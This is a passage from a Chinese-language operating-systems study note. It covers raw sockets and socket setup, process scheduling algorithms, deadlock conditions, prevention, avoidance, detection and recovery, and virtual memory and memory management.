<p>三是<strong>原始套接字</strong>，原始套接字允许对较低层次的协议直接访问，比如 IP、 ICMP 协议，它常用于检验新的协议实现，或者访问现有服务中配置的新设备，因为 RAW SOCKET 可以自如地控制 Windows 下的多种协议，能够对网络底层的传输机制进行控制，所以可以应用原始套接字来操纵网络层和传输层应用。比如，我们可以通过 RAW SOCKET 来接收发向本机的 ICMP、IGMP 协议包，或者接收 TCP/IP 栈不能够处理的 IP 包，也可以用来发送一些自定包头或自定协议的 IP 包。网络监听技术很大程度上依赖于 SOCKET_RAW。</p>
<p>原始套接字与标准套接字的区别在于：</p>
<p>原始套接字可以读写内核没有处理的 IP 数据包，而流套接字只能读取 TCP 协议的数据，数据报套接字只能读取 UDP 协议的数据。因此，如果要访问其他协议发送数据必须使用原始套接字。</p>
<h4 id="套接字通信的建立"><a href="#套接字通信的建立" class="headerlink" title="套接字通信的建立"></a>套接字通信的建立</h4><p><a href="http://qiniu.xiaoming.net.cn/Socket%E9%80%9A%E4%BF%A1%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B.webp"><img src="http://qiniu.xiaoming.net.cn/Socket%E9%80%9A%E4%BF%A1%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B.webp" alt="Socket通信基本流程"></a></p>
<p><strong>服务器端</strong>：</p>
<ol>
<li>首先服务器应用程序用系统调用socket来创建一个套接字，它是系统分配给该服务器进程的类似文件描述符的资源，它不能与其他的进程共享。</li>
<li>然后，服务器进程会给套接字起个名字，我们使用系统调用bind来给套接字命名。然后服务器进程就开始等待客户连接到这个套接字。</li>
<li>接下来，系统调用listen来创建一个队列并将其用于存放来自客户的进入连接。</li>
<li>最后，服务器通过系统调用accept来接受客户的连接。它会创建一个与原有的命名套接不同的新套接字，这个套接字只用于与这个特定客户端进行通信，而命名套接字（即原先的套接字）则被保留下来继续处理来自其他客户的连接（建立客户端和服务端的用于通信的流，进行通信）。</li>
</ol>
<p><strong>客户端</strong>：</p>
<ol>
<li>客户应用程序首先调用socket来创建一个未命名的套接字，然后将服务器的命名套接字作为一个地址来调用connect与服务器建立连接。</li>
<li>一旦连接建立，我们就可以像使用底层的文件描述符那样用套接字来实现双向数据的通信（通过流进行数据传输）。</li>
</ol>
<h1 id="11-进程调度算法"><a href="#11-进程调度算法" class="headerlink" title="11. 进程调度算法"></a>11. 进程调度算法</h1><p>不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法。</p>
<h2 id="批处理系统"><a href="#批处理系统" class="headerlink" title="批处理系统"></a>批处理系统</h2><p>批处理系统没有太多的用户操作，在该系统中，调度算法的目的是保证吞吐量和周转时间（从提交到终止的时间）</p>
<h3 id="先来先服务调度算法（FCFS）"><a href="#先来先服务调度算法（FCFS）" class="headerlink" title="先来先服务调度算法（FCFS）"></a>先来先服务调度算法（FCFS）</h3><p>对于作业调度，每次调度从后备作业队列中选择一个或多个最先进入该队列的作业，将它们调入内存，为它们分配资源、创建进程，然后放入就绪队列；对于进程调度，每次调度是从就绪队列中选择一个最先进入该队列的进程，为之分配处理机，使之投入运行。</p>
<p>先来先服务(FCFS)调度算法是一种最简单的调度算法，该算法既可用于作业调度，也可用于进程调度。</p>
<ul>
<li>FCFS算法对长作业有利，不利于短作业。</li>
<li>有利于CPU繁忙型作业，不利于I/O繁忙型作业。</li>
</ul>
<h3 id="短作业（进程）优先调度算法（SJF）"><a href="#短作业（进程）优先调度算法（SJF）" class="headerlink" title="短作业（进程）优先调度算法（SJF）"></a>短作业（进程）优先调度算法（SJF）</h3><p>短作业优先(SJF)的调度算法是从后备队列中选择一个或若干个估计运行时间最短的作业，将它们调入内存运行。而短进程优先(SPF)调度算法则是从就绪队列中选出一个估计运行时间最短的进程，将处理机分配给它，使它立即执行并一直执行到完成，或发生某事件而被阻塞放弃处理机时再重新调度。</p>
<ul>
<li>SJ(P)F 调度算法能有效地降低作业的平均等待时间，提高系统吞吐量。</li>
<li>该算法对长作业不利</li>
<li>该算法完全未考虑作业的紧迫程度，因而不能保证紧迫性作业(进程)会被及时处理。</li>
<li>由于作业(进程)的长短只是根据用户所提供的估计执行时间而定的，而用户又可能会有意或无意地缩短其作业的估计运行时间，致使该算法不一定能真正做到短作业优先调度。</li>
</ul>
<h3 id="最短剩余时间优先（SRTN）"><a href="#最短剩余时间优先（SRTN）" class="headerlink" title="最短剩余时间优先（SRTN）"></a>最短剩余时间优先（SRTN）</h3><p>最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度。 当一个新的作业到达时，其整个运行时间与当前进程的剩余时间作比较。如果新的进程需要的时间更少，则挂起当前进程，运行新的进程。否则新的进程等待。</p>
<h2 id="交互式系统"><a href="#交互式系统" class="headerlink" title="交互式系统"></a>交互式系统</h2><p>交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应。</p>
<h3 id="时间片轮转"><a href="#时间片轮转" class="headerlink" title="时间片轮转"></a>时间片轮转</h3><p>在分时系统中，为保证能及时响应用户的请求，必须采用基于时间片的轮转式进程调度算法。系统将所有的就绪进程按先来先服务的原则排成一个队列，每次调度时，把 CPU 分配给队首进程，并令其执行一个时间片。当执行的时间片用完时，由一个计时器发出时钟中断请求，调度程序便据此信号来停止该进程的执行，并将它送往就绪队列的末尾；然后，再把处理机分配给就绪队列中新的队首进程，同时也让它执行一个时间片。</p>
<p>时间片轮转算法的效率和时间片的大小有很大关系，因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。而如果时间片过长，那么实时性就不能得到保证。</p>
<h3 id="优先级调度"><a href="#优先级调度" class="headerlink" title="优先级调度"></a>优先级调度</h3><p>为每个进程分配一个优先级，按优先级进行调度。为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。</p>
<h3 id="多级反馈队列调度算法"><a href="#多级反馈队列调度算法" class="headerlink" title="多级反馈队列调度算法"></a>多级反馈队列调度算法</h3><p>是目前公认的一种较好的进程调度算法。具体过程如下：</p>
<ol>
<li>设置多个就绪队列，并为各个队列赋予不同的优先级。第一个队列的优先级最高，第二个队列次之，其余各队列的优先权逐个降低。该算法赋予各个队列中进程执行时间片的大小也各不相同，<strong>优先权愈高的队列中，为每个进程所规定的执行时间片就愈小</strong>。</li>
<li>当一个新进程进入内存后，首先将它放入第一队列的末尾，按 FCFS 原则排队等待调度。当轮到该进程执行时，如它能在该时间片内完成，便可准备撤离系统；如果它在一个时间片结束时尚未完成，调度程序便将该进程转入第二队列的末尾，再同样地按 FCFS 原则等待调度执行；如果它在第二队列中运行一个时间片后仍未完成，再依次将它放入第三队列，……，如此下去，当一个长作业(进程)从第一队列依次降到第 n 队列后，在第 n 队列中便采取按时间片轮转的方式运行。</li>
<li>仅当第一队列空闲时，调度程序才调度第二队列中的进程运行；仅当第 1～(i-1)队列均空时，才会调度第 i 队列中的进程运行。如果处理机正在第 i 队列中为某进程服务时，又有新进程进入优先权较高的队列(第 1～(i-1)中的任何一个队列)，则此时新进程将抢占正在运行进程的处理机，即由调度程序把正在运行的进程放回到第 i 队列的末尾，把处理机分配给新到的高优先权进程。</li>
</ol>
<p>可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。</p>
<h2 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h2><p>实时系统要求一个请求在一个确定时间内得到响应。</p>
<p>分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。</p>
<h1 id="12-死锁产生的必要条件"><a href="#12-死锁产生的必要条件" class="headerlink" title="12. 死锁产生的必要条件"></a>12. 死锁产生的必要条件</h1><ul>
<li><strong>互斥条件</strong>：指进程对所分配到的资源进行排它性使用，即在一段时间内某资源只由一个进程占用。如果此时还有其它进程请求该资源，则请求者只能等待，直至占有该资源的进程用毕释放。</li>
<li><strong>请求和保持条件</strong>：指进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放。</li>
<li><strong>不剥夺条件</strong>：指进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放。</li>
<li><strong>环路等待条件</strong>：指在发生死锁时，必然存在一个进程——资源的环形链，即进程集合{P0，P1，P2，…，Pn}中的 P0正在等待一个 P1占用的资源； P1正在等待 P2占用的资源，……，Pn正在等待已被P0占用的资源。</li>
</ul>
<h1 id="13-处理死锁的基本方法"><a href="#13-处理死锁的基本方法" class="headerlink" title="13. 处理死锁的基本方法"></a>13. 处理死锁的基本方法</h1><p>主要有以下五种方法：</p>
<ul>
<li>鸵鸟策略</li>
<li>预防死锁：该方法是通过设置某些限制条件，去破坏产生死锁的四个必要条件中的一个或几个条件，来预防发生死锁。但由于所施加的限制条件往往太严格，因而可能会导致系统资源利用率和系统吞吐量降低。</li>
<li>避免死锁：是在资源的动态分配过程中，用某种方法去防止系统进入不安全状态，从而避免发生死锁。这种方法只需事先施加较弱的限制条件，便可获得较高的资源利用率及系统吞吐量，但实现难度较高。</li>
<li>检测死锁：是允许系统在运行过程中发生死锁，但可通过系统所设置的检测机构，及时地检测出死锁的发生，并精确地确定与死锁有关的进程和资源； 然后，采取适当措施，从系统中将已发生的死锁清除掉。</li>
<li>解除死锁：与检测死锁相配套的一种措施。当检测到系统中已发生死锁时，须将进程从死锁状态中解脱出来。常用的实施方法是<strong>撤消或挂起一些进程</strong>，以便回收一些资源，再将这些资源分配给已处于阻塞状态的进程，使之转为就绪状态，以继续运行。死锁的检测和解除措施有可能使系统获得较好的资源利用率和吞吐量，但在实现上难度也最大。</li>
</ul>
<h2 id="鸵鸟策略"><a href="#鸵鸟策略" class="headerlink" title="鸵鸟策略"></a>鸵鸟策略</h2><p>把头埋在沙子里，假装根本没发生问题。</p>
<p>因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。</p>
<p>当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。</p>
<p>大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。</p>
<h2 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h2><p>预防死锁的方法是使四个必要条件中的第 2、3、4 个条件之一不能成立，来避免发生死锁。至于必要条件 1，因为它是由设备的固有特性所决定的，不仅不能改变，还应加以保证。</p>
<h3 id="摒弃“请求和保持”条件"><a href="#摒弃“请求和保持”条件" class="headerlink" title="摒弃“请求和保持”条件"></a>摒弃“请求和保持”条件</h3><p>在采用这种方法时，系统规定所有进程在开始运行之前，都必须一次性地申请其在整个运行过程所需的全部资源。</p>
<ul>
<li>优点：简单、易于实现且很安全</li>
<li>缺点：资源严重浪费，恶化了系统资源的利用率；造成使进程延迟运行</li>
</ul>
<h3 id="摒弃不剥夺条件"><a href="#摒弃不剥夺条件" class="headerlink" title="摒弃不剥夺条件"></a>摒弃不剥夺条件</h3><p>在采用这种方法时系统规定，进程是逐个地提出对资源的要求的。当一个已经保持了某些资源的进程，再提出新的资源请求而不能立即得到满足时，必须释放它已经保持了的所有资源，待以后需要时再重新申请。这意味着某一进程已经占有的资源，在运行过程中会被暂时地释放掉，也可认为是被剥夺了，从而摒弃了“不剥夺”条件。</p>
<ul>
<li>缺点：实现起来比较复杂且要付出很大的代价。一个资源在使用一 段时间后，它的被迫释放可能会造成前段工作的失效，即使是采取了某些防范措施，也还会使进程前后两次运行的信息不连续。此外，这种策略还可能因为反复地申请和释放资源，致使进程的执行被无限地推迟，这不仅延长了进程的周转时间，而且也增加了系统开销，降低了系统吞吐量。</li>
</ul>
<h3 id="摒弃“环路等待”条件"><a href="#摒弃“环路等待”条件" class="headerlink" title="摒弃“环路等待”条件"></a>摒弃“环路等待”条件</h3><p>这种方法中规定，系统将所有资源按类型进行线性排队，并赋予不同的序号。所有进程对资源的请求必须严格按照资源序号递增的次序提出，这样，在所形成的资源分配图中，不可能再出现环路，因而摒弃了“环路等待”条件。</p>
<ul>
<li>缺点：是为系统中各类资源所分配(确定)的序号必须相对稳定，这就限制了新类型设备的增加；作业(进程)使用各类资源的顺序与系统规定的顺序不同，造成对资源的浪费；这种按规定次序申请的方法，必然会限制用户简单、自主地编程。</li>
</ul>
<h2 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h2><p>所谓安全状态，是指系统能按某种进程顺序(P1，P2，…，Pn)(称〈P1，P2，…，Pn〉序列为安全序列)，来为每个进程 Pi分配其所需资源，直至满足每个进程对资源的最大需求，使每个进程都可顺利地完成。如果系统无法找到这样一个安全序列，则称系统处于不安全状态。<br>并非所有的不安全状态都必然会转为死锁状态，但当系统进入不安全状态后，便有可能进而进入死锁状态；反之，只要系统处于安全状态，系统便可避免进入死锁状态。因此，避免死锁的实质在于：系统在进行资源分配时，如何使系统不进入不安全状态。</p>
<p><a href="https://qiniu.xiaoming.net.cn/%E5%AE%89%E5%85%A8%E7%8A%B6%E6%80%81.png"><img src="https://qiniu.xiaoming.net.cn/%E5%AE%89%E5%85%A8%E7%8A%B6%E6%80%81.png" alt="安全状态"></a></p>
<p>图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。</p>
<blockquote>
<p>预防死锁和避免死锁这两种方法实质上都是通过施加某些限制条件，来预防发生死锁。两者的主要差别在于：为预防死锁所施加的限制条件较严格，这往往会影响进程的并发执行；而为避免死锁所施加的限制条件则较宽松，这给进程的运行提供了较宽松的环境，有利于进程的并发执行。</p>
</blockquote>
<h3 id="利用银行家算法避免死锁"><a href="#利用银行家算法避免死锁" class="headerlink" title="利用银行家算法避免死锁"></a>利用银行家算法避免死锁</h3><h4 id="银行家算法中的数据结构"><a href="#银行家算法中的数据结构" class="headerlink" title="银行家算法中的数据结构"></a>银行家算法中的数据结构</h4><ul>
<li><p><code>可利用资源向量Available</code>：是一个含有 m 个元素的数组，其中的每一个元素代表一类可利用的资源数目，其初始值是系统中所配置的该类全部可用资源的数目，其数值随该类资源的分配和回收而动态地改变。如果 Available[j]=K，则表示系统中现有Rj类资源K个。</p>
</li>
<li><p><code>最大需求矩阵Max</code>：是一个 n×m 的矩阵，它定义了系统中 n 个进程中的每一个进程对 m 类资源的最大需求。如果 Max[i,j]=K，则表示进程 i 需要Rj类资源的最大数目为 K。</p>
</li>
<li><p><code>分配矩阵Allocation</code>：是一个 n×m 的矩阵，它定义了系统中每一类资源当前已分配给每一进程的资源数。如果 Allocation[i,j]=K，则表示进程 i 当前已分得Rj类资源的数目为 K。</p>
</li>
<li><p><code>需求矩阵Need</code>：是一个 n×m 的矩阵，用以表示每一个进程尚需的各类资源数。如果 Need[i,j]=K，则表示进程 i 还需要Rj类资源 K 个，方能完成其任务。</p>
<blockquote>
<p>Need[i, j]=Max[i, j]-Allocation[i, j]</p>
</blockquote>
</li>
</ul>
<h4 id="银行家算法"><a href="#银行家算法" class="headerlink" title="银行家算法"></a>银行家算法</h4><p>设<code>Request i</code>是进程 Pi 的请求向量，如果<code>Request i[j]=K</code>，表示进程Pi需要 K 个 R j类型的资源。当Pi发出资源请求后，系统按下述步骤进行检查：</p>
<ol>
<li><p>如果<code>Request i[j]≤Need[i,j]</code>，便转向步骤(2)；否则认为出错，因为它所需要的资源数已超过它所宣布的最大值。</p>
</li>
<li><p>如果<code>Requesti[j]≤Available[j]</code>，便转向步骤(3)；否则，表示尚无足够资源，Pi须等待。</p>
</li>
<li><p>系统<strong>试探着</strong>把资源分配给进程 P i，并修改下面数据结构中的数值：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Available[j]= Available[j]-Request i[j];</span><br><span class="line">Allocation[i,j] = Allocation[i,j]+Request i[j];</span><br><span class="line">Need[i,j] = Need[i,j]-Request i[j];</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>
</li>
<li><p>系统执行<strong>安全性算法</strong>，检查此次资源分配后系统是否处于安全状态。若安全，才正式将资源分配给进程 Pi，以完成本次分配；否则，将本次的试探分配作废，恢复原来的资源分配状态，让进程 Pi等待。</p>
</li>
</ol>
<h4 id="安全性算法"><a href="#安全性算法" class="headerlink" title="安全性算法"></a>安全性算法</h4><p>系统所执行的安全性算法可描述如下：</p>
<ol>
<li>设置两个向量：</li>
</ol>
<ul>
<li><code>工作向量work</code>：它表示系统可提供给进程继续运行所需的各类资源数目，它含有m个元素，在执行安全算法开始时，<code>Work=Available</code>。</li>
<li><code>Finish</code>：它表示系统是否有足够的资源分配给进程，使之运行完成。开始时先做<code>Finish[i]=false</code>；当有足够资源分配给进程时，再令<code>Finish[i]=true</code>。</li>
</ul>
<ol>
<li>从进程集合中找到一个能满足下述条件的进程：</li>
</ol>
<ul>
<li><code>Finish[i]=false;</code></li>
<li><code>Need[i,j]≤Work[j]</code>;若找到，执行步骤3，否则，执行步骤4。</li>
</ul>
<ol>
<li><p>当进程Pi获得资源后，可顺利执行，直至完成，并释放出分配给它的资源，故应执行：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Work[j] = Work[j]+Allocation[i,j];</span><br><span class="line">Finish[i] = <span class="literal">true</span>;</span><br><span class="line">go to step <span class="number">2</span>;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果所有进程的<code>Finish[i]=true</code>都满足，则表示系统处于安全状态；否则，系统处于不安全状态。</p>
</li>
</ol>
<h2 id="检测死锁"><a href="#检测死锁" class="headerlink" title="检测死锁"></a>检测死锁</h2><p>不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。</p>
<h3 id="每种类型一个资源的死锁检测"><a href="#每种类型一个资源的死锁检测" class="headerlink" title="每种类型一个资源的死锁检测"></a>每种类型一个资源的死锁检测</h3><p><a href="https://qiniu.xiaoming.net.cn/%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E5%9B%BE.png"><img src="https://qiniu.xiaoming.net.cn/%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E5%9B%BE.png" alt="资源分配图"></a></p>
<p>上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。</p>
<p>图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。</p>
<p>每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。</p>
<h3 id="每种类型多个资源的死锁检测"><a href="#每种类型多个资源的死锁检测" class="headerlink" title="每种类型多个资源的死锁检测"></a>每种类型多个资源的死锁检测</h3><p><a href="https://qiniu.xiaoming.net.cn/%E5%A4%9A%E4%B8%AA%E8%B5%84%E6%BA%90%E7%9A%84%E6%AD%BB%E9%94%81%E6%A3%80%E6%B5%8B.png"><img src="https://qiniu.xiaoming.net.cn/%E5%A4%9A%E4%B8%AA%E8%B5%84%E6%BA%90%E7%9A%84%E6%AD%BB%E9%94%81%E6%A3%80%E6%B5%8B.png" alt="多个资源的死锁检测"></a></p>
<p>上图中，有三个进程四个资源，每个数据代表的含义如下：</p>
<ul>
<li>E 向量：资源总量</li>
<li>A 向量：资源剩余量</li>
<li>C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量</li>
<li>R 矩阵：每个进程请求的资源数量</li>
</ul>
<p>进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。</p>
<p>算法总结如下：</p>
<p>每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。</p>
<ol>
<li>寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。</li>
<li>如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。</li>
<li>如果没有这样一个进程，算法终止。</li>
</ol>
<h2 id="死锁解除"><a href="#死锁解除" class="headerlink" title="死锁解除"></a>死锁解除</h2><p>当发现有进程死锁时，便应立即把它们从死锁状态中解脱出来。常采用解除死锁的两种方法是：</p>
<ol>
<li>剥夺资源。从其它进程剥夺足够数量的资源给死锁进程，以解除死锁状态。</li>
<li>撤消进程。最简单的撤消进程的方法是使全部死锁进程都夭折掉；稍微温和一点的方法是按照某种顺序逐个地撤消进程，直至有足够的资源可用，使死锁状态消除为止。</li>
</ol>
<h1 id="14-什么是虚拟内存"><a href="#14-什么是虚拟内存" class="headerlink" title="14. 什么是虚拟内存"></a>14. 什么是虚拟内存</h1><p>维基百科中有几句话是这样介绍虚拟内存的：</p>
<blockquote>
<p><strong>虚拟内存</strong> 使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。与没有使用虚拟内存技术的系统相比，使用这种技术的系统使得大型程序的编写变得更容易，对真正的物理内存（例如 RAM）的使用也更有效率。目前，大多数操作系统都使用了虚拟内存，如 Windows 家族的“虚拟内存”；Linux 的“交换空间”等。</p>
</blockquote>
<p>虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。</p>
<p>为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。<strong>它让每个进程产生了一种自己在独享主存的错觉（每个进程拥有一片连续完整的内存空间）</strong>。</p>
<p>从上面的描述中可以看出，虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序成为可能。例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。</p>
<p>通过 <strong>虚拟内存</strong> 可以让程序可以拥有超过系统物理内存大小的可用内存空间。另外，<strong>虚拟内存为每个进程提供了一个一致的、私有的地址空间，它让每个进程产生了一种自己在独享主存的错觉（每个进程拥有一片连续完整的内存空间）</strong>。这样会更加有效地管理内存并减少出错。</p>
<p><strong>虚拟内存</strong>是计算机系统内存管理的一种技术，我们可以手动设置自己电脑的虚拟内存。不要单纯认为虚拟内存只是“使用硬盘空间来扩展内存“的技术。<strong>虚拟内存的重要意义是它定义了一个连续的虚拟地址空间</strong>，并且<strong>把内存扩展到硬盘空间</strong>。</p>
<p>虚拟内存主要提供了如下三个重要的能力：</p>
<ul>
<li>它把主存看作为一个存储在硬盘上的虚拟地址空间的高速缓存，并且只在主存中缓存活动区域（按需缓存）。</li>
<li>它为每个进程提供了一个一致的地址空间，从而降低了程序员对内存管理的复杂性。</li>
<li>它还保护了每个进程的地址空间不会被其他进程破坏。</li>
</ul>
<h2 id="虚拟（逻辑）地址和逻辑地址"><a href="#虚拟（逻辑）地址和逻辑地址" class="headerlink" title="虚拟（逻辑）地址和逻辑地址"></a>虚拟（逻辑）地址和逻辑地址</h2><p>编程一般只有可能和逻辑地址打交道，比如在 C 语言中，指针里面存储的数值就可以理解成为内存里的一个地址，这个地址也就是我们说的逻辑地址，逻辑地址由操作系统决定。物理地址指的是真实物理内存中地址，更具体一点来说就是内存地址寄存器中的地址。物理地址是内存单元真正的地址。</p>
<p>进程可用的虚拟地址范围称为该进程的<em>虚拟地址空间</em>。每个用户模式进程都有其自己的专用虚拟地址空间。对于32位进程，虚拟地址空间通常为2 GB范围 <code>0x00000000</code> 至 <code>0x7FFFFFFF</code>。对于64位 Windows 上的 64 位进程，虚拟地址空间为128 TB范围 <code>0x000&#39;00000000</code> 到 <code>0x7FFF&#39;FFFFFFFF</code>。</p>
<p>该图说明了虚拟地址空间的一些关键功能。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E7%9A%84%E5%85%B3%E9%94%AE%E5%8A%9F%E8%83%BD.png"><img src="http://qiniu.xiaoming.net.cn/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E7%9A%84%E5%85%B3%E9%94%AE%E5%8A%9F%E8%83%BD.png" alt="两个进程的虚拟地址空间图"></a></p>
<p>该图显示了两个64位进程的虚拟地址空间：Notepad.exe 和 MyApp.exe。每个进程都有自己的虚拟地址空间，该地址空间从 <code>0x000&#39;0000000</code> 到 <code>0x7FF&#39;FFFFFFFF</code>。每个阴影块代表一页（4 KB大小）的虚拟或物理内存。请注意，记事本进程使用三个连续的虚拟地址页面，从 <code>0x7F7&#39;93950000</code> 开始。但是，虚拟地址的这三个连续页面被映射到物理内存中的非连续页面。还要注意，两个进程都使用从 <code>0x7F7&#39;93950000</code> 开始的虚拟内存页面，但是这些虚拟页面被映射到物理内存的不同页面。</p>
<h2 id="为什么要有虚拟地址空间呢？"><a href="#为什么要有虚拟地址空间呢？" class="headerlink" title="为什么要有虚拟地址空间呢？"></a>为什么要有虚拟地址空间呢？</h2><p>先从没有虚拟地址空间的时候说起吧！没有虚拟地址空间的时候，<strong>程序都是直接访问和操作的都是物理内存</strong> 。但是这样有什么问题呢？</p>
<ol>
<li>用户程序可以访问任意内存，寻址内存的每个字节，这样就很容易（有意或者无意）破坏操作系统，造成操作系统崩溃。</li>
<li>想要同时运行多个程序特别困难，比如你想同时运行一个微信和一个 QQ 音乐都不行。为什么呢？举个简单的例子：微信在运行的时候给内存地址 1xxx 赋值后，QQ 音乐也同样给内存地址 1xxx 赋值，那么 QQ 音乐对内存的赋值就会覆盖微信之前所赋的值，这就造成了微信这个程序就会崩溃。</li>
</ol>
<p><strong>总结来说：如果直接把物理地址暴露出来的话会带来严重问题，比如可能对操作系统造成伤害以及给同时运行多个程序造成困难。</strong></p>
<p>通过虚拟地址访问内存有以下优势：</p>
<ul>
<li>程序可以使用一系列相邻的虚拟地址来访问物理内存中不相邻的大内存缓冲区。</li>
<li>程序可以使用一系列虚拟地址来访问大于可用物理内存的内存缓冲区。当物理内存的供应量变小时，内存管理器会将物理内存页（通常大小为 4 KB）保存到磁盘文件。数据或代码页会根据需要在物理内存与磁盘之间移动。</li>
<li>不同进程使用的虚拟地址彼此隔离。一个进程中的代码无法更改正在由另一进程或操作系统使用的物理内存。</li>
</ul>
<h1 id="15-虚拟内存技术的实现"><a href="#15-虚拟内存技术的实现" class="headerlink" title="15. 虚拟内存技术的实现"></a>15. 虚拟内存技术的实现</h1><p><strong>虚拟内存的实现需要建立在离散分配的内存管理方式的基础上。</strong> 虚拟内存的实现有以下三种方式：</p>
<ol>
<li><strong>请求分页存储管理</strong> ：建立在分页管理之上，为了支持虚拟存储器功能而增加了请求调页功能和页面置换功能。请求分页是目前最常用的一种实现虚拟存储器的方法。请求分页存储管理系统中，在作业开始运行之前，仅装入当前要执行的部分段即可运行。假如在作业运行的过程中发现要访问的页面不在内存，则由处理器通知操作系统按照对应的页面置换算法将相应的页面调入到主存，同时操作系统也可以将暂时不用的页面置换到外存中。</li>
<li><strong>请求分段存储管理</strong> ：建立在分段存储管理之上，增加了请求调段功能、分段置换功能。请求分段储存管理方式就如同请求分页储存管理方式一样，在作业开始运行之前，仅装入当前要执行的部分段即可运行；在执行过程中，可使用请求调入中断动态装入要访问但又不在内存的程序段；当内存空间已满，而又需要装入新的段时，根据置换功能适当调出某个段，以便腾出空间而装入新的段。</li>
<li><strong>请求段页式存储管理</strong></li>
</ol>
<p><strong>请求分页与分页存储管理，两者有何不同呢？</strong></p>
<p>请求分页存储管理建立在分页管理之上。他们的根本区别是是否将程序全部所需的全部地址空间都装入主存，这也是请求分页存储管理可以提供虚拟内存的原因，我们在上面已经分析过了。</p>
<p>它们之间的根本区别在于是否将一作业的全部地址空间同时装入主存。请求分页存储管理不要求将作业全部地址空间同时装入主存。基于这一点，请求分页存储管理可以提供虚存，而分页存储管理却不能提供虚存。</p>
<p>不管是上面那种实现方式，我们一般都需要：</p>
<ol>
<li>一定容量的内存和外存：在载入程序的时候，只需要将程序的一部分装入内存，而将其他部分留在外存，然后程序就可以执行了；</li>
<li><strong>缺页中断</strong>：如果<strong>需执行的指令或访问的数据尚未在内存</strong>（称为缺页或缺段），则由处理器通知操作系统将相应的页面或段<strong>调入到内存</strong>，然后继续执行程序；</li>
<li><strong>虚拟地址空间</strong> ：逻辑地址到物理地址的变换。</li>
</ol>
<h1 id="16-常见的几种内存管理机制"><a href="#16-常见的几种内存管理机制" class="headerlink" title="16. 常见的几种内存管理机制"></a>16. 常见的几种内存管理机制</h1><p>简单分为<strong>连续分配管理方式</strong>和<strong>非连续分配管理方式</strong>这两种。连续分配管理方式是指为一个用户程序分配一个连续的内存空间，常见的如<strong>块式管理</strong> 。同样地，非连续分配管理方式允许一个程序使用的内存分布在离散或者说不相邻的内存中，常见的如<strong>页式管理</strong>和<strong>段式管理</strong>。</p>
<h2 id="块式管理"><a href="#块式管理" class="headerlink" title="块式管理"></a>块式管理</h2><p>远古时代的计算机操系统的内存管理方式。将内存分为几个固定大小的块，每个块中只包含一个进程。如果程序运行需要内存的话，操作系统就分配给它一块，如果程序运行只需要很小的空间的话，分配的这块内存很大一部分几乎被浪费了。这些在每个块中未被利用的空间，我们称之为碎片。</p>
